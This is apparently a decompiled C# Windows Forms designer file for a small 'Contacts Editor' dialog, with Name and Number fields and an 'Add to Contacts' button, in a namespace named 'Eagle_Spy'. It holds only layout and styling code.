namespace Eagle_Spy
{
	// Token: 0x02000012 RID: 18
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class AddNumber : global::System.Windows.Forms.Form
	{
		// Token: 0x060001A9 RID: 425 RVA: 0x0000C678 File Offset: 0x0000A878
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x060001AA RID: 426 RVA: 0x0000C6B8 File Offset: 0x0000A8B8
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.TOpacity = new global::System.Windows.Forms.Timer(this.components);
			this.guna2BorderlessForm1 = new global::Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.L0 = new global::System.Windows.Forms.Label();
			this.InputText0 = new global::System.Windows.Forms.TextBox();
			this.L1 = new global::System.Windows.Forms.Label();
			this.InputText1 = new global::System.Windows.Forms.TextBox();
			this.Panel1 = new global::System.Windows.Forms.Panel();
			this.guna2Panel2 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.label1 = new global::System.Windows.Forms.Label();
			this.drakeUIButtonIcon2 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.Panel1.SuspendLayout();
			this.guna2Panel2.SuspendLayout();
			base.SuspendLayout();
			this.TOpacity.Interval = 1;
			this.TOpacity.Tick += new global::System.EventHandler(this.TOpacity_Tick);
			this.guna2BorderlessForm1.BorderRadius = 15;
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			this.guna2BorderlessForm1.ResizeForm = false;
			this.guna2BorderlessForm1.ShadowColor = global::System.Drawing.Color.Blue;
			this.guna2BorderlessForm1.TransparentWhileDrag = true;
			this.L0.AutoSize = true;
			this.L0.Font = new global::System.Drawing.Font("Calibri", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.L0.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.L0.Location = new global::System.Drawing.Point(21, 77);
			this.L0.Name = "L0";
			this.L0.Size = new global::System.Drawing.Size(55, 19);
			this.L0.TabIndex = 1;
			this.L0.Text = "Name :";
			this.InputText0.BackColor = global::System.Drawing.Color.White;
			this.InputText0.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.InputText0.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.InputText0.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
			this.InputText0.Location = new global::System.Drawing.Point(21, 110);
			this.InputText0.Name = "InputText0";
			this.InputText0.Size = new global::System.Drawing.Size(248, 19);
			this.InputText0.TabIndex = 2;
			this.L1.AutoSize = true;
			this.L1.Font = new global::System.Drawing.Font("Calibri", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.L1.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.L1.Location = new global::System.Drawing.Point(21, 154);
			this.L1.Name = "L1";
			this.L1.Size = new global::System.Drawing.Size(68, 19);
			this.L1.TabIndex = 4;
			this.L1.Text = "Number :";
			this.InputText1.BackColor = global::System.Drawing.Color.White;
			this.InputText1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.InputText1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.InputText1.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
			this.InputText1.Location = new global::System.Drawing.Point(21, 176);
			this.InputText1.Name = "InputText1";
			this.InputText1.Size = new global::System.Drawing.Size(248, 19);
			this.InputText1.TabIndex = 5;
			this.Panel1.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.Panel1.Controls.Add(this.guna2Panel2);
			this.Panel1.Controls.Add(this.drakeUIButtonIcon2);
			this.Panel1.Controls.Add(this.InputText1);
			this.Panel1.Controls.Add(this.L1);
			this.Panel1.Controls.Add(this.InputText0);
			this.Panel1.Controls.Add(this.L0);
			this.Panel1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.Panel1.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
			this.Panel1.Location = new global::System.Drawing.Point(0, 0);
			this.Panel1.Name = "Panel1";
			this.Panel1.Size = new global::System.Drawing.Size(299, 300);
			this.Panel1.TabIndex = 1;
			this.guna2Panel2.BackColor = global::System.Drawing.Color.FromArgb(10, 0, 36);
			this.guna2Panel2.Controls.Add(this.label1);
			this.guna2Panel2.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.guna2Panel2.Location = new global::System.Drawing.Point(0, 0);
			this.guna2Panel2.Name = "guna2Panel2";
			this.guna2Panel2.Size = new global::System.Drawing.Size(299, 30);
			this.guna2Panel2.TabIndex = 15;
			this.guna2Panel2.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.guna2Panel2_MouseDown);
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 14.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.label1.Location = new global::System.Drawing.Point(63, 1);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(151, 24);
			this.label1.TabIndex = 14;
			this.label1.Text = "Contacts Editor";
			this.drakeUIButtonIcon2.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.drakeUIButtonIcon2.FillColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon2.FillDisableColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon2.FillHoverColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon2.FillPressColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon2.FillSelectedColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon2.Font = new global::System.Drawing.Font("Candara", 14.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.drakeUIButtonIcon2.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.drakeUIButtonIcon2.ForeDisableColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon2.ForePressColor = global::System.Drawing.Color.Aqua;
			this.drakeUIButtonIcon2.ForeSelectedColor = global::System.Drawing.Color.MediumSpringGreen;
			this.drakeUIButtonIcon2.ImageAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.drakeUIButtonIcon2.Location = new global::System.Drawing.Point(55, 239);
			this.drakeUIButtonIcon2.Name = "drakeUIButtonIcon2";
			this.drakeUIButtonIcon2.Radius = 9;
			this.drakeUIButtonIcon2.RectColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.drakeUIButtonIcon2.RectDisableColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon2.RectHoverColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon2.RectPressColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon2.RectSelectedColor = global::System.Drawing.Color.Empty;
			this.drakeUIButtonIcon2.RectSides = global::System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
			this.drakeUIButtonIcon2.Size = new global::System.Drawing.Size(170, 29);
			this.drakeUIButtonIcon2.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.drakeUIButtonIcon2.StyleCustomMode = true;
			this.drakeUIButtonIcon2.Symbol = 61525;
			this.drakeUIButtonIcon2.SymbolSize = 30;
			this.drakeUIButtonIcon2.TabIndex = 13;
			this.drakeUIButtonIcon2.Text = "Add to Contacts";
			this.drakeUIButtonIcon2.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
			this.drakeUIButtonIcon2.TipsColor = global::System.Drawing.Color.FromArgb(0, 0, 192);
			this.drakeUIButtonIcon2.Click += new global::System.EventHandler(this.drakeUIButtonIcon2_Click);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(299, 300);
			base.Controls.Add(this.Panel1);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "AddNumber";
			base.Opacity = 0.0;
			base.ShowIcon = false;
			this.Text = "Add Number";
			base.TopMost = true;
			base.Load += new global::System.EventHandler(this.AddNumber_Load);
			this.Panel1.ResumeLayout(false);
			this.Panel1.PerformLayout();
			this.guna2Panel2.ResumeLayout(false);
			this.guna2Panel2.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x04000039 RID: 57
		private global::System.ComponentModel.IContainer components;

		// Token: 0x0400003C RID: 60
		private global::Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;

		// Token: 0x0400003D RID: 61
		internal global::System.Windows.Forms.Panel Panel1;

		// Token: 0x0400003E RID: 62
		private global::DrakeUI.Framework.DrakeUIButtonIcon drakeUIButtonIcon2;

		// Token: 0x0400003F RID: 63
		internal global::System.Windows.Forms.TextBox InputText1;

		// Token: 0x04000040 RID: 64
		internal global::System.Windows.Forms.Label L1;

		// Token: 0x04000041 RID: 65
		internal global::System.Windows.Forms.TextBox InputText0;

		// Token: 0x04000042 RID: 66
		internal global::System.Windows.Forms.Label L0;

		// Token: 0x04000043 RID: 67
		private global::System.Windows.Forms.Label label1;

		// Token: 0x04000044 RID: 68
		private global::Guna.UI2.WinForms.Guna2Panel guna2Panel2;

		// Token: 0x04000045 RID: 69
		internal global::System.Windows.Forms.Timer TOpacity;
	}
}
